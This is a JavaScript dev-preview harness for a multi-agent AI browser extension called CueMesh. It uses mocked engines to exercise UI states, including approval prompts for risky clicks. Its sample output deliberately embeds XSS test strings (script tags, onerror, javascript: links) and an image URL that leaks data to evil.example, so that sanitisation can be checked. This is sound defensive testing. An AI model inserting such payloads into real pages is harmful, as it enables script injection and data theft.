// 開發預覽：假的 engine／store／browser，可重現所有畫面狀態。
// 事件格式與真實引擎相同（docs/integration-contract.md），也用真實的模型目錄。
import { AGENT_TYPES, MODELS, ROUTES } from '../core/catalog.js';
import { applyTheme, mountApp } from './app.js';
import { createApprovalQueue } from './logic.js';

const params = new URLSearchParams(location.search);
const stateName = params.get('state') ?? 'ready';
const theme = params.get('theme');
const bare = params.get('bare') === '1';
const width = params.get('width');

const clone = (value) => structuredClone(value);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
let uid = 0;
const id = (prefix) => `${prefix}-${(uid += 1)}`;

// ---------- 假 store ----------
function createFakeStore({ keys = {}, projects, runs = [], workflows = [], stats = [] }) {
  const data = {
    keys: { ...keys },
    projects: projects ?? [{ id: 'p1', name: '競品研究', description: '', createdAt: Date.now() - 86400000 }, { id: 'p2', name: '官網改版', description: '', createdAt: Date.now() - 3600000 }],
    runs,
    workflows,
    stats,
    settings: { approvalMode: 'always', maxCostUsd: 2, teamPrefs: { review: 'anthropic/claude-opus-5-5' } },
  };
  return {
    data,
    listProjects: async () => clone(data.projects),
    createProject: async ({ name, description = '' }) => {
      const project = { id: id('p'), name, description, createdAt: Date.now() };
      data.projects.push(project);
      return clone(project);
    },
    deleteProject: async (projectId) => {
      data.projects = data.projects.filter((p) => p.id !== projectId);
      data.runs = data.runs.filter((r) => r.projectId !== projectId);
    },
    listRuns: async (projectId) => clone(data.runs.filter((r) => r.projectId === projectId).sort((a, b) => b.createdAt - a.createdAt)),
    getKeyStatus: async () => Object.fromEntries(['anthropic', 'openai', 'gemini'].map((p) => [p, { set: Boolean(data.keys[p]), last4: data.keys[p]?.slice(-4) ?? null }])),
    setKey: async (provider, value) => {
      if (value.includes('fail')) throw new Error('模擬的儲存錯誤');
      data.keys[provider] = value;
    },
    removeKey: async (provider) => {
      delete data.keys[provider];
    },
    getSettings: async () => clone(data.settings),
    updateSettings: async (patch) => {
      data.settings = { ...data.settings, ...patch };
      return clone(data.settings);
    },
    listWorkflows: async () => clone(data.workflows),
    saveWorkflow: async (workflow) => {
      const saved = { ...workflow, id: workflow.id ?? id('wf') };
      data.workflows = [...data.workflows.filter((w) => w.id !== saved.id), saved];
      return clone(saved);
    },
    deleteWorkflow: async (workflowId) => {
      data.workflows = data.workflows.filter((w) => w.id !== workflowId);
    },
    getStats: async () => clone(data.stats),
  };
}

// ---------- 假 browser ----------
function samplePng() {
  const canvas = document.createElement('canvas');
  canvas.width = 160;
  canvas.height = 100;
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#1b3a57';
  ctx.fillRect(0, 0, 160, 100);
  ctx.fillStyle = '#f2b53d';
  ctx.fillRect(14, 16, 60, 10);
  ctx.fillStyle = '#efe7d6';
  for (let i = 0; i < 4; i += 1) ctx.fillRect(14, 36 + i * 12, 130 - i * 16, 6);
  return { mediaType: 'image/png', data: canvas.toDataURL('image/png').split(',')[1] };
}

function createFakeBrowser() {
  return {
    failNext: null,
    cancelNext: false,
    async captureContext(kind) {
      await sleep(kind === 'region' || kind === 'element' ? 700 : 200);
      if (this.cancelNext) {
        this.cancelNext = false;
        return null;
      }
      if (this.failNext) {
        const message = this.failNext;
        this.failNext = null;
        throw new Error(message);
      }
      const base = { type: kind, tabId: 1, url: 'https://shop.example.com/pricing', title: '方案與價格｜Example' };
      if (kind === 'selection') return { ...base, text: '專業版每月 US$29，年繳享 8 折，含 10 個席位。' };
      if (kind === 'element') return { ...base, text: '按鈕「立即升級」', image: samplePng() };
      if (kind === 'region') return { ...base, image: samplePng() };
      return { ...base, text: '整頁內容……（這裡只是預覽用的假資料）' };
    },
    releaseRun() {},
  };
}

// ---------- 假 engine ----------
function createFakeEngine({ store, approvals, script }) {
  const listeners = new Set();
  const runs = new Map();
  const controls = new Map();

  const emit = (run, type, payload = {}) => {
    run.seq += 1;
    const event = { seq: run.seq, runId: run.id, type, payload, createdAt: Date.now() };
    run.events.push(event);
    if (type === 'run_update') Object.assign(run, payload.fields);
    if (type === 'task_created') run.tasks.push({ id: payload.taskId, runId: run.id, parentTaskId: payload.parentTaskId ?? null, title: payload.title, agent: payload.agent, position: payload.position, status: 'pending', sources: [] });
    if (type === 'task_update') Object.assign(run.tasks.find((t) => t.id === payload.taskId), payload.fields);
    for (const fn of listeners) fn(event);
    return event;
  };

  return {
    runs,
    // 只有預覽用：直接注入事件，測試極端資料
    inject: (runId, type, payload) => emit(runs.get(runId), type, payload),
    start({ projectId, goal, context = [], options = {} }) {
      const run = {
        id: id('run'), projectId, goal, status: 'planning', mode: options.workflowId ? 'workflow' : options.mode ?? 'auto',
        planSummary: '', finalResult: null, error: null, costUsd: 0, inputTokens: 0, outputTokens: 0,
        createdAt: Date.now(), finishedAt: null, context, tasks: [], artifacts: [], events: [], seq: 0,
      };
      // 取消用的 Promise 放在 run 之外：run 會被 structuredClone，Promise 不能複製
      let reject;
      const abort = new Promise((_, r) => {
        reject = r;
      });
      abort.catch(() => {});
      controls.set(run.id, reject);
      runs.set(run.id, run);
      store.data.runs.push(run);
      script({ run, emit, approvals, abort }).catch((err) => {
        emit(run, 'run_update', { fields: { status: err.cancelled ? 'cancelled' : 'failed', error: err.message, finishedAt: Date.now() } });
        emit(run, 'run_finished', { status: err.cancelled ? 'cancelled' : 'failed', error: err.message });
      });
      return run.id;
    },
    cancel(runId) {
      const run = runs.get(runId);
      if (!run || run.finishedAt) return false;
      const err = new Error('使用者取消');
      err.cancelled = true;
      controls.get(runId)(err);
      return true;
    },
    subscribe(fn) {
      listeners.add(fn);
      return () => listeners.delete(fn);
    },
    getRun: async (runId) => {
      const run = runs.get(runId) ?? store.data.runs.find((r) => r.id === runId);
      return run ? clone(run) : null;
    },
  };
}

// ---------- 預覽用的最終結果：同時放真實內容與攻擊字串，檢查消毒是否生效 ----------
const FINAL_RESULT = `## 結論
**專業版最划算**：年繳每席 US$23，比競品 A 便宜約 18%，而且含 API 存取。

### 三家比較

| 方案 | 月繳 | 年繳（每月） | API 存取 | 席位上限 |
|---|---:|---:|---|---:|
| Example 專業版 | $29 | $23 | 有 | 10 |
| 競品 A | $35 | $28 | 加購 | 5 |
| 競品 B | $19 | $16 | 無 | 3 |

### 重點
1. 競品 B 最便宜，但沒有 API，不符合你的需求。
2. Example 年繳要一次付清，資料來自[官方價格頁](https://example.com/pricing)。
   - 含 14 天退款
   - 價格未稅
3. 需要再確認：\`enterprise_plan\` 是否有教育折扣。

> 以上價格查核於今天，實際金額以結帳頁為準。

### 測試用：以下是不可信內容，應該全部以文字呈現

<script>alert('這段不該執行')</script>

<img src=x onerror="alert('這段也不該執行')">

[看起來像連結](javascript:alert('不該可以點'))

![外傳資料的圖片](https://evil.example/leak?data=secret)

\`\`\`html
<button onclick="alert(1)">程式碼區塊</button>
\`\`\`
`;

const SAMPLE_HTML = `<!doctype html><html lang="zh-Hant"><meta charset="utf-8"><style>
html,body{margin:0;height:100%;background:#101820;color:#fff;font:14px sans-serif;display:grid;place-items:center;overflow:hidden}
canvas{position:fixed;inset:0;width:100%;height:100%}#t{position:relative;padding:4px 8px;background:#0008}
</style><canvas id="c"></canvas><div id="t"></div><script>
const c=document.getElementById('c'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;let a=0;
(function f(){x.fillStyle='#10182022';x.fillRect(0,0,c.width,c.height);a+=.04;for(let i=0;i<7;i++){const r=26+i*11;
x.beginPath();x.arc(c.width/2+Math.cos(a+i)*r,c.height/2+Math.sin(a*1.3+i)*r,6,0,7);x.fillStyle='hsl('+(i*48+a*40)+' 80% 62%)';x.fill()}requestAnimationFrame(f)})();
let s;try{s=parent.document.title?'隔離失敗：讀到父頁面':'隔離失敗'}catch(e){s='沙盒生效：無法存取父頁面'}
try{localStorage.setItem('x','1');s+='／隔離失敗：可用 localStorage'}catch(e){s+='，也無法使用儲存空間'}
document.getElementById('t').textContent=s;
<\/script></html>`;

// ---------- 劇本 ----------
function makeScript({ outcome = 'done', freezeAt = null, pace = 0 }) {
  return async ({ run, emit, approvals, abort }) => {
    const wait = (ms) => Promise.race([sleep(ms * pace), abort]);
    const freeze = (label) => (freezeAt === label ? abort : Promise.resolve());
    const usage = (provider, model, input, output, costUsd) => {
      const total = (run.costUsd ?? 0) + costUsd;
      run.costUsd = total;
      run.inputTokens += input;
      run.outputTokens += output;
      emit(run, 'usage', { provider, model, input, output, costUsd, totalCostUsd: total });
    };
    const ask = (request) => Promise.race([approvals.request({ runId: run.id, ...request }), abort]);

    await freeze('plan-wait');
    await wait(500);
    usage('anthropic', 'claude-opus-5-5', 1800, 420, 0.0156);
    emit(run, 'run_update', { fields: { planSummary: '先查三家的公開牌價，再到價格頁核對方案細節，最後整理成比較表並審查。', status: 'running' } });
    emit(run, 'plan', {
      summary: '先查三家的公開牌價，再到價格頁核對方案細節，最後整理成比較表並審查。',
      tasks: [
        { key: 't1', title: '查三家公開牌價', agent: 'research', dependsOn: [] },
        { key: 't2', title: '到價格頁核對方案', agent: 'browser', dependsOn: ['t1'] },
        { key: 't3', title: '做成互動比較頁', agent: 'coding', dependsOn: ['t1'] },
        { key: 't4', title: '審查成果', agent: 'review', dependsOn: ['t2', 't3'] },
      ],
      estimatedCostUsd: 0.42,
    });
    const task = (key, title, agent, position, parentTaskId = null) => {
      emit(run, 'task_created', { taskId: key, parentTaskId, title, agent, position });
      return key;
    };
    const t1 = task(`${run.id}-t1`, '查三家公開牌價', 'research', 0);
    const t2 = task(`${run.id}-t2`, '到價格頁核對方案', 'browser', 1);
    const t3 = task(`${run.id}-t3`, '做成互動比較頁', 'coding', 2);
    const t4 = task(`${run.id}-t4`, '審查成果', 'review', 3);
    await wait(500);
    await freeze('planned');

    const startedAt = Date.now();
    emit(run, 'task_update', { taskId: t1, fields: { status: 'running', provider: 'gemini', model: 'gemini-3.8-flash', startedAt } });
    await wait(900);
    emit(run, 'task_update', { taskId: t1, fields: { provider: 'openai', model: 'gpt-6.1-sol' } });
    emit(run, 'fallback', { taskId: t1, provider: 'openai', model: 'gpt-6.1-sol', reason: 'gemini-3.8-flash 回傳 429：請求太頻繁，已改用下一個模型' });
    usage('openai', 'gpt-6.1-sol', 5200, 900, 0.0194);
    await wait(900);
    emit(run, 'task_update', {
      taskId: t1,
      fields: {
        status: 'done',
        result: '三家牌價：Example 專業版 **$29**、競品 A **$35**、競品 B **$19**。',
        sources: [
          { title: 'Example 官方價格頁', url: 'https://example.com/pricing' },
          { title: '競品 A 方案比較', url: 'https://www.competitor-a.example/plans' },
          { title: '惡意來源', url: 'javascript:alert(1)' },
        ],
        finishedAt: startedAt + 18200,
      },
    });

    emit(run, 'task_update', { taskId: t2, fields: { status: 'running', provider: 'anthropic', model: 'claude-opus-5-5', startedAt: Date.now() } });
    emit(run, 'task_update', { taskId: t3, fields: { status: 'running', provider: 'anthropic', model: 'claude-sonnet-5-5', startedAt: Date.now() } });
    emit(run, 'agent_message', { taskId: t3, text: '比較頁需要最新的席位上限，請 @research 補查。' });
    const child = task(`${run.id}-c1`, '@research：查三家席位上限', 'research', 1001, t3);
    emit(run, 'mention', { fromTaskId: t3, fromAgent: 'coding', toTaskId: child, agent: 'research', request: '查三家方案的席位上限，附官方來源' });
    emit(run, 'task_update', { taskId: child, fields: { status: 'running', provider: 'gemini', model: 'gemini-4-argon', startedAt: Date.now() } });

    emit(run, 'tool_call', { taskId: t2, tool: 'browser_snapshot', args: {} });
    await wait(400);
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_snapshot', ok: true, denied: false, error: null });
    emit(run, 'tool_call', { taskId: t2, tool: 'browser_navigate', args: { url: 'https://shop.example.com/pricing' } });
    await wait(400);
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_navigate', ok: true, denied: false, error: null });
    emit(run, 'tool_call', { taskId: t2, tool: 'browser_scroll', args: { pixels: 600 } });
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_scroll', ok: true, denied: false, error: null });
    usage('anthropic', 'claude-opus-5-5', 8000, 1300, 0.058);
    await wait(500);
    await freeze('running');

    emit(run, 'tool_call', { taskId: t2, tool: 'browser_click', args: { ref: 'e12' } });
    const decision = await ask({
      tool: 'browser_click', args: { ref: 'e12' }, risk: 'act', reason: '會點擊頁面上的按鈕並改變頁面內容',
      url: 'https://shop.example.com/pricing', element: { role: 'button', name: '顯示年繳價格' },
    });
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_click', ok: decision.approved, denied: !decision.approved, error: decision.approved ? null : decision.note ?? '使用者拒絕' });
    await wait(400);

    emit(run, 'tool_call', { taskId: t2, tool: 'browser_type', args: { ref: 'e20', text: 'team@example.com' } });
    const typed = ask({
      tool: 'browser_type', args: { ref: 'e20', text: 'team@example.com' }, risk: 'act', reason: '會在表單欄位輸入文字',
      url: 'https://shop.example.com/quote', element: { role: 'textbox', name: '電子郵件' },
    });
    emit(run, 'tool_call', { taskId: t2, tool: 'browser_click', args: { ref: 'e31' } });
    const risky = ask({
      tool: 'browser_click', args: { ref: 'e31' }, risk: 'high', reason: '按鈕文字包含「送出」與「付款」，送出後可能無法復原',
      url: 'https://shop.example.com/checkout?plan=pro&seats=10', element: { role: 'button', name: '確認付款並送出訂單 US$230' },
    });
    const [typedResult, riskyResult] = await Promise.all([typed, risky]);
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_type', ok: typedResult.approved, denied: !typedResult.approved, error: typedResult.approved ? null : typedResult.note ?? '使用者拒絕' });
    emit(run, 'browser_result', { taskId: t2, tool: 'browser_click', ok: riskyResult.approved, denied: !riskyResult.approved, error: riskyResult.approved ? null : riskyResult.note ?? '使用者拒絕這個高風險動作' });
    await wait(300);

    emit(run, 'task_update', { taskId: child, fields: { status: 'done', result: '席位上限：10、5、3。', finishedAt: Date.now() + 9000 } });
    emit(run, 'task_update', { taskId: t2, fields: { status: 'done', result: '已核對價格頁：年繳每席 US$23。沒有送出任何訂單。', finishedAt: Date.now() + 41000 } });
    usage('gemini', 'gemini-4-argon', 3000, 700, 0.013);
    await wait(500);

    const artifacts = [
      { id: `${run.id}-a1`, runId: run.id, name: 'compare.html', kind: 'html', content: SAMPLE_HTML, createdBy: 'coding', createdAt: Date.now() },
      { id: `${run.id}-a2`, runId: run.id, name: '價格比較.md', kind: 'markdown', content: FINAL_RESULT, createdBy: 'research', createdAt: Date.now() },
      { id: `${run.id}-a3`, runId: run.id, name: 'prices.json', kind: 'data', content: '{"example":29,"a":35,"b":19}', createdBy: 'coding', createdAt: Date.now() },
    ];
    for (const artifact of artifacts) {
      run.artifacts.push(artifact);
      emit(run, 'tool_call', { taskId: t3, tool: 'workspace_write', args: { name: artifact.name, kind: artifact.kind } });
      emit(run, 'artifact', { artifactId: artifact.id, name: artifact.name, kind: artifact.kind, createdBy: artifact.createdBy });
    }
    emit(run, 'task_update', { taskId: t3, fields: { status: 'done', result: '比較頁已寫入 `compare.html`。', finishedAt: Date.now() + 52000 } });
    usage('anthropic', 'claude-sonnet-5-5', 12000, 4200, 0.066);
    await wait(500);

    if (outcome === 'failed') {
      emit(run, 'task_update', { taskId: t4, fields: { status: 'failed', error: 'gpt-6.1-sol：API key 無效（401）', finishedAt: Date.now() } });
      const err = new Error('所有可用模型都失敗：openai 回傳 401，API key 無效或已過期。');
      throw err;
    }
    if (outcome === 'cancelled') {
      const err = new Error('使用者取消');
      err.cancelled = true;
      throw err;
    }

    if (outcome === 'partial') {
      emit(run, 'task_update', { taskId: t4, fields: { status: 'failed', error: '所有可用模型都失敗：連線逾時', finishedAt: Date.now() } });
      emit(run, 'notice', { text: '審查沒有完成，結果未經第二個模型檢查。' });
    } else {
      emit(run, 'task_update', { taskId: t4, fields: { status: 'running', provider: 'anthropic', model: 'claude-opus-5-5', startedAt: Date.now() } });
      await wait(700);
      emit(run, 'task_update', { taskId: t4, fields: { status: 'done', result: '逐條對照需求，沒有發現問題。', finishedAt: Date.now() + 15000 } });
    }
    usage('anthropic', 'claude-opus-5-5', 6000, 1200, 0.048);
    const finishedAt = run.createdAt + 96000;
    emit(run, 'run_update', { fields: { status: outcome === 'partial' ? 'partial' : 'done', finalResult: FINAL_RESULT, finishedAt } });
    emit(run, 'run_finished', { status: outcome === 'partial' ? 'partial' : 'done' });
  };
}

// ---------- 真實引擎 + 假供應商 ----------
// 用真正的 engine.js 與 store.js，只把 AI 換成劇本，確認 UI 和實際事件流對得上。
async function createRealEngineDeps() {
  const [{ createEngine }, { createStore, memoryKv }, { ProviderError }] = await Promise.all([
    import('../core/engine.js'), import('../core/store.js'), import('../providers/types.js'),
  ]);
  const store = await createStore({ kv: memoryKv() });
  await store.setKey('anthropic', 'test-key-anth');
  await store.setKey('openai', 'test-key-open');
  await store.setKey('gemini', 'test-key-gemi');
  const project = await store.createProject({ name: '真實引擎測試', description: '' });
  await store.saveWorkflow({ name: '兩步流程', steps: [
    { title: '查資料', agent: 'research', instructions: '查資料' },
    { title: '審查', agent: 'review', instructions: '審查' },
  ] });

  const usage = { input: 1200, output: 300 };
  let geminiFailed = false;
  const reply = (text, extra = {}) => ({ text, toolCalls: [], usage, sources: [], raw: { text }, ...extra });
  const call = (name, args) => ({ id: id('call'), name, args });
  const turn = (providerName) => async ({ system, messages, signal }) => {
    await sleep(60);
    if (signal?.aborted) throw new DOMException('已取消', 'AbortError');
    if (system.includes('任務規劃器')) {
      return reply(JSON.stringify({
        summary: '先查資料，再寫成網頁，並用瀏覽器核對，最後審查。',
        tasks: [
          { id: 't1', title: '查資料', agent: 'research', instructions: '查價格', dependsOn: [], useContext: false },
          { id: 't2', title: '寫比較頁', agent: 'coding', instructions: '寫網頁', dependsOn: ['t1'], useContext: false },
          { id: 't3', title: '到網頁核對', agent: 'browser', instructions: '核對', dependsOn: ['t1'], useContext: false },
          { id: 't4', title: '審查', agent: 'review', instructions: '審查', dependsOn: ['t2', 't3'], useContext: false },
        ],
      }));
    }
    const toolRounds = messages.filter((m) => m.role === 'tool').length;
    if (system.includes('研究 agent')) {
      if (providerName === 'gemini' && !geminiFailed) {
        geminiFailed = true;
        throw new ProviderError('rate', 'gemini：請求太頻繁', { provider: 'gemini', status: 429 });
      }
      return reply('查到價格：**$29**。', { sources: [{ title: '官方價格頁', url: 'https://example.com/pricing' }, { title: '壞連結', url: 'javascript:alert(1)' }] });
    }
    if (system.includes('程式 agent')) {
      if (toolRounds === 0) return reply('先寫檔，再請人補資料。', { toolCalls: [call('workspace_write', { name: 'compare.html', kind: 'html', content: SAMPLE_HTML })] });
      if (toolRounds === 1) return reply('需要補查。', { toolCalls: [call('delegate', { agent: 'research', request: '查席位上限' })] });
      return reply('比較頁完成。');
    }
    if (system.includes('瀏覽器 agent')) {
      if (toolRounds === 0) return reply('', { toolCalls: [call('browser_snapshot', {})] });
      if (toolRounds === 1) return reply('', { toolCalls: [call('browser_click', { ref: 'e12' })] });
      return reply('已核對，沒有送出任何東西。');
    }
    if (system.includes('審查 agent')) return reply('沒有發現問題。');
    return reply(`## 整合結果\n已完成，來源見下方。\n\n<script>window.__xss = 1<\/script>\n\n[壞連結](javascript:window.__xss=1)`);
  };
  const providers = Object.fromEntries(['anthropic', 'openai', 'gemini'].map((name) => [name, { name, turn: turn(name) }]));

  const approvals = createApprovalQueue();
  const browser = {
    ...createFakeBrowser(),
    async execute({ runId, tool, args }) {
      await sleep(40);
      if (tool !== 'browser_click') return { ok: true, text: '頁面內容' };
      const answer = await approvals.request({
        runId, tool, args, risk: 'high', reason: '按鈕文字包含「送出」', url: 'https://shop.example.com/checkout',
        element: { role: 'button', name: '送出' },
      });
      return answer.approved ? { ok: true, text: '已點擊' } : { ok: false, denied: true, error: answer.note || '使用者拒絕' };
    },
  };
  const engine = createEngine({ store, providers, browser });
  return { store, engine, browser, approvals, projectId: project.id };
}

// ---------- 預設資料 ----------
const WORKFLOWS = [
  { id: 'wf1', name: '競品週報', steps: [
    { title: '查最新消息', agent: 'research', instructions: '查過去七天競品的價格與功能變動' },
    { title: '整理成週報', agent: 'coding', instructions: '整理成一頁 HTML 週報' },
    { title: '審查', agent: 'review', instructions: '檢查是否有沒附來源的結論' },
  ] },
];
const STATS = [
  { provider: 'gemini', model: 'gemini-3.8-flash', agentType: 'research', successes: 18, failures: 2, totalMs: 412000, costUsd: 0.214 },
  { provider: 'anthropic', model: 'claude-opus-5-5', agentType: 'coding', successes: 9, failures: 1, totalMs: 1240000, costUsd: 1.82 },
  { provider: 'openai', model: 'gpt-6.1-sol', agentType: 'review', successes: 3, failures: 4, totalMs: 310000, costUsd: 0.46 },
  { provider: 'anthropic', model: 'claude-opus-5-5', agentType: 'browser', successes: 6, failures: 0, totalMs: 620000, costUsd: 0.93 },
];
const HISTORY = () => [
  { id: 'h1', projectId: 'p1', goal: '比較這三個產品的價格，整理成表格', status: 'done', mode: 'auto', costUsd: 0.2204, createdAt: Date.now() - 3600000, finishedAt: Date.now() - 3500000, finalResult: '## 結論\n專業版最划算。', planSummary: '查價再整理', tasks: [{ id: 'h1t', title: '查價格', agent: 'research', status: 'done', provider: 'gemini', model: 'gemini-3.8-flash', sources: [{ title: '官方', url: 'https://example.com' }], position: 0 }], artifacts: [], events: [], context: [{ type: 'region', hasImage: true, url: 'https://a.example' }] },
  { id: 'h2', projectId: 'p1', goal: '幫我把這份報告的數字做成 3D 圖表', status: 'partial', mode: 'auto', costUsd: 0.5120, createdAt: Date.now() - 86400000, finishedAt: Date.now() - 86000000, finalResult: '已完成圖表，但審查沒有跑完。', tasks: [], artifacts: [], events: [] },
  { id: 'h3', projectId: 'p1', goal: '到後台匯出上個月的訂單', status: 'failed', mode: 'auto', costUsd: 0.0312, createdAt: Date.now() - 172800000, finishedAt: Date.now() - 172700000, error: '瀏覽器動作被拒絕，無法繼續。', tasks: [], artifacts: [], events: [] },
  { id: 'h4', projectId: 'p1', goal: '分析首頁的跳出率', status: 'cancelled', mode: 'council', costUsd: 0.0021, createdAt: Date.now() - 259200000, finishedAt: Date.now() - 259100000, error: '使用者取消', tasks: [], artifacts: [], events: [] },
];
const TWO_KEYS = { anthropic: 'sk-ant-xxxxxxxxabcd', gemini: 'AIzaxxxxxxxxx9f3e' };
const ALL_KEYS = { ...TWO_KEYS, openai: 'sk-xxxxxxxxxx71c2' };
const DEMO_GOAL = '比較這三個產品的價格，整理成表格，並做一個可以互動的比較頁';

const STATES = {
  onboarding: { label: '空狀態（沒有 API key）', keys: {} },
  ready: { label: '任務頁（可開始）', keys: TWO_KEYS, goal: DEMO_GOAL, withContext: true },
  live: { label: '完整流程（真實速度）', keys: ALL_KEYS, goal: DEMO_GOAL, script: { pace: 1 } },
  planning: { label: '執行中：規劃', keys: ALL_KEYS, script: { freezeAt: 'plan-wait' }, auto: true, slowPlan: true },
  running: { label: '執行中', keys: ALL_KEYS, script: { freezeAt: 'running' }, auto: true },
  approval: { label: '批准對話框', keys: ALL_KEYS, script: {}, auto: true },
  'approval-high': { label: '批准對話框：高風險', keys: ALL_KEYS, script: {}, auto: true, approveUntilHigh: true },
  done: { label: '完成', keys: ALL_KEYS, script: {}, auto: true, approveAll: true },
  partial: { label: '部分完成', keys: ALL_KEYS, script: { outcome: 'partial' }, auto: true, approveAll: true },
  failed: { label: '失敗', keys: ALL_KEYS, script: { outcome: 'failed' }, auto: true, approveAll: true },
  cancelled: { label: '已取消', keys: ALL_KEYS, script: { outcome: 'cancelled' }, auto: true, approveAll: true },
  settings: { label: '設定頁', keys: TWO_KEYS, view: 'settings', workflows: WORKFLOWS, stats: STATS },
  'settings-empty': { label: '設定頁（沒有資料）', keys: {}, view: 'settings' },
  history: { label: '任務歷史', keys: TWO_KEYS, view: 'history', history: true },
  'load-error': { label: '載入失敗', keys: {}, breakStore: true },
  'real-engine': { label: '真實引擎 + 假 AI', realEngine: true, goal: DEMO_GOAL },
};

// ---------- 工具列 ----------
function buildToolbar() {
  const bar = document.getElementById('dev-bar');
  const link = (query, text, current) => {
    const url = new URLSearchParams(location.search);
    for (const [key, value] of Object.entries(query)) {
      if (value === null) url.delete(key);
      else url.set(key, value);
    }
    const a = document.createElement('a');
    a.href = `?${url}`;
    a.textContent = text;
    if (current) a.setAttribute('aria-current', 'true');
    return a;
  };
  const heading = (tag, text) => {
    const el = document.createElement(tag);
    el.textContent = text;
    return el;
  };
  bar.append(heading('h1', 'CueMesh 開發預覽'), heading('h2', '狀態'));
  for (const [key, value] of Object.entries(STATES)) bar.append(link({ state: key }, value.label, key === stateName));
  bar.append(heading('h2', '主題'));
  bar.append(link({ theme: null }, '跟隨系統', !theme), link({ theme: 'light' }, '淺色', theme === 'light'), link({ theme: 'dark' }, '深色', theme === 'dark'));
  bar.append(heading('h2', '面板寬度'));
  for (const w of ['320', '400', '560']) bar.append(link({ width: w }, `${w}px`, (width ?? '400') === w));
}

// ---------- 啟動 ----------
async function boot() {
  const config = STATES[stateName] ?? STATES.ready;
  if (bare) document.body.classList.add('dev--bare');
  if (width) document.documentElement.style.setProperty('--dev-width', `${Number(width)}px`);
  buildToolbar();

  const real = config.realEngine ? await createRealEngineDeps() : null;
  const store = real?.store ?? createFakeStore({
    keys: config.keys,
    workflows: clone(config.workflows ?? WORKFLOWS),
    stats: config.stats ?? [],
    runs: config.history ? HISTORY() : [],
  });
  if (config.breakStore) store.listProjects = async () => { throw new Error('模擬的儲存空間錯誤：無法讀取 chrome.storage'); };

  const approvals = real?.approvals ?? createApprovalQueue();
  const browser = real?.browser ?? createFakeBrowser();
  const engine = real?.engine ?? createFakeEngine({ store, approvals, script: makeScript(config.script ?? {}) });

  // 排隊數量變動也會通知，同一個請求可能排到多個計時器，所以到點時要確認它還在佇列最前面
  const autoApprove = (shouldApprove) => approvals.subscribe((request) => {
    if (!request || !shouldApprove(request)) return;
    setTimeout(() => {
      if (approvals.current() === request) approvals.respond(true);
    }, 0);
  });
  if (config.approveAll) autoApprove(() => true);
  if (config.approveUntilHigh) autoApprove((request) => request.risk !== 'high');

  const app = mountApp(document.getElementById('app'), {
    engine, store, browser, approvals,
    catalog: { AGENT_TYPES, MODELS, ROUTES },
    previewUrl: null, // 一般網頁沒有擴充功能的安全政策，srcdoc 可以直接執行
  });
  await app.ready();
  // 主題參數要蓋過 mountApp 依偏好設定的結果
  if (theme) applyTheme(theme);

  window.__dev = { app, engine, store, browser, approvals };

  if (config.goal) app.setGoal(config.goal);
  if (config.withContext) {
    app.addContextItem(await browser.captureContext('selection'));
    app.addContextItem(await browser.captureContext('region'));
  }
  if (config.view) app.navigate(config.view);
  if (config.auto) {
    app.setGoal(DEMO_GOAL);
    await sleep(40);
    await app.start();
  }
  document.documentElement.dataset.devReady = 'true';
}

boot().catch((err) => {
  console.error('開發預覽啟動失敗', err);
  document.getElementById('app').textContent = `開發預覽啟動失敗：${err.message}`;
});
